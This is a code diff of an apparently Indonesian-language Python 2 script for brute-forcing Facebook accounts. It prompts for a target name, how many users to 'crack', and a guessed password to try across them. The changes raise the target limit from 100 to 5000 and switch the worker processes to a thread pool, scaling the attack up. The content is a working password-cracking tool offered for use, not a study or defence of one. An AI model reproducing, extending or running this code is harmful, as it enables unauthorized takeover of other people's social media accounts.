@@ -5,7 +5,7 @@
 
 from brute import brute
 from mechanize import Browser
-from multiprocessing import Process, Pool
+from multiprocessing.pool import Process, ThreadPool
 from useragents import baner, multi_ban, deviv, divev
 import os, sys, time, cookielib, mechanize, subprocess
 os.system('' if os.name == 'nt' else 'chmod +x *')
@@ -29,7 +29,7 @@ def user_dev():
   try:
   	print multi_ban
   	us = raw_input("\033[96;1m {\033[97;1m@\033[96;1m}\033[92;1m Masukkan Nama Facebook, Conth:\033[96;1m lucinta\n\033[97;1m  ==> ")
-  	jumlah = input("\n\033[96;1m\033[96;1m {\033[97;1m$\033[96;1m}\033[92;1m Jumlah User Yg Mau Di Crack\033[96;1m (Max=100):\n\033[93;1m  ==> ")
+  	jumlah = input("\n\033[96;1m\033[96;1m {\033[97;1m$\033[96;1m}\033[92;1m Jumlah User Yg Mau Di Crack\033[96;1m (Max=5000):\n\033[93;1m  ==> ")
   	san_dev = raw_input("\n\033[96;1m\033[96;1m {\033[97;1m$\033[96;1m}\033[92;1m Sandi Yg Munkin Digunkn, conth:\033[96;1m lucinta123\n\033[97;1m  ==> ")
   	# set password
   	if us == '' or us == ' ' or san_dev == '' or san_dev == ' ':
@@ -79,18 +79,18 @@ def pro_dev(ival):
 	  except:
 	  	pass
 
-def dev_id():
-	for dev in users:
-		pro = Process(target=pro_dev, args=(dev,))
-		multi.append(pro)
-		pro.start()
-
-	for dev in multi:
-		dev.join()
-
 # def dev_id():
-# 	p = Pool(30)
-# 	p.map(pro_dev, users)
+# 	for dev in users:
+# 		pro = Process(target=pro_dev, args=(dev,))
+# 		multi.append(pro)
+# 		pro.start()
+
+# 	for dev in multi:
+# 		dev.join()
+
+def dev_id():
+	dev = ThreadPool(2)
+	dev.map(pro_dev, users)
 
 def run():
 	th = Process(target=dev_id)
@@ -99,6 +99,7 @@ def run():
 	divev()
 	deviv()
 	print "\n\033[97;1m     ==[ \033[96;1m Selesai......\033[97;1m  ]== \n"
+	
 if __name__ == '__main__':
 	try:
 		os.system('cls' if os.name == 'nt' else 'clear')
